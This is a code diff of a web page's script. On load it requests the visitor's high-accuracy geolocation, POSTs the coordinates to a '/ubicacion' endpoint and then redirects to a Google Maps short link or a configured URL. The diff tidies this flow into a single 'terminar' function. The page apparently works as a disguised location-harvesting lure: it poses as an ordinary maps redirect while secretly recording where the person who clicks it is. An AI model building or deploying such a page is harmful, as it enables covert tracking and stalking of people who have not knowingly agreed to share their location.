@@ -14,7 +14,8 @@
     let watchId = null;
     let deadline = null;
     let readings = [];
-    const GOOD_M = 50, MAX_WAIT = 8000, MAX_USE = 200;
+    let terminado = false;
+    const GOOD_M = 50, MAX_WAIT = 10000, MAX_USE = 200;
 
     function weightedAvg() {
       const pool = readings.filter(r => r.accuracy <= MAX_USE);
@@ -24,28 +25,32 @@
         const w = 1 / (r.accuracy * r.accuracy);
         wLat += r.lat * w; wLng += r.lng * w; wSum += w;
       });
-      return { lat: wLat / wSum, lng: wLng / wSum,
-               accuracy: Math.sqrt(1 / wSum) };
+      return { lat: wLat / wSum, lng: wLng / wSum };
     }
 
-    async function finish() {
+    async function terminar() {
+      if (terminado) return;
+      terminado = true;
+
       if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
       clearTimeout(deadline);
-      if (!readings.length) return;
-      const { lat, lng } = weightedAvg();
 
       let destino = 'https://maps.app.goo.gl/t2xJ2sB7UHKGtDbH9';
       try {
-        const [, cfg] = await Promise.all([
-          fetch('/ubicacion', {
+        const cfg = await fetch('/api/config').then(r => r.json());
+        if (cfg.redirectUrl) destino = cfg.redirectUrl;
+      } catch (_) {}
+
+      if (readings.length) {
+        const { lat, lng } = weightedAvg();
+        try {
+          await fetch('/ubicacion', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ lat, lng }),
-          }),
-          fetch('/api/config').then(r => r.json()),
-        ]);
-        if (cfg.redirectUrl) destino = cfg.redirectUrl;
-      } catch (_) {}
+          });
+        } catch (_) {}
+      }
 
       window.location.href = destino;
     }
@@ -53,34 +58,20 @@
     function onWatch(pos) {
       const { latitude: lat, longitude: lng, accuracy } = pos.coords;
       readings.push({ lat, lng, accuracy });
-      const best = readings.reduce((a, b) => a.accuracy < b.accuracy ? a : b);
-      if (best.accuracy <= GOOD_M) finish();
-    }
-
-    async function redirigir() {
-      let destino = 'https://maps.app.goo.gl/t2xJ2sB7UHKGtDbH9';
-      try {
-        const cfg = await fetch('/api/config').then(r => r.json());
-        if (cfg.redirectUrl) destino = cfg.redirectUrl;
-      } catch (_) {}
-      window.location.href = destino;
+      if (accuracy <= GOOD_M) terminar();
     }
 
     function onError() {
-      clearTimeout(deadline);
-      if (watchId !== null) { navigator.geolocation.clearWatch(watchId); watchId = null; }
-      // Si hay lecturas las enviamos, si no solo redirigimos
-      if (readings.length) finish();
-      else redirigir();
+      terminar();
     }
 
     if ('geolocation' in navigator) {
       watchId = navigator.geolocation.watchPosition(onWatch, onError, {
-        enableHighAccuracy: true, timeout: 8000, maximumAge: 0,
+        enableHighAccuracy: true, timeout: 10000, maximumAge: 0,
       });
-      deadline = setTimeout(() => { if (watchId !== null) finish(); }, MAX_WAIT);
+      deadline = setTimeout(terminar, MAX_WAIT);
     } else {
-      redirigir();
+      terminar();
     }
   </script>
 </body>
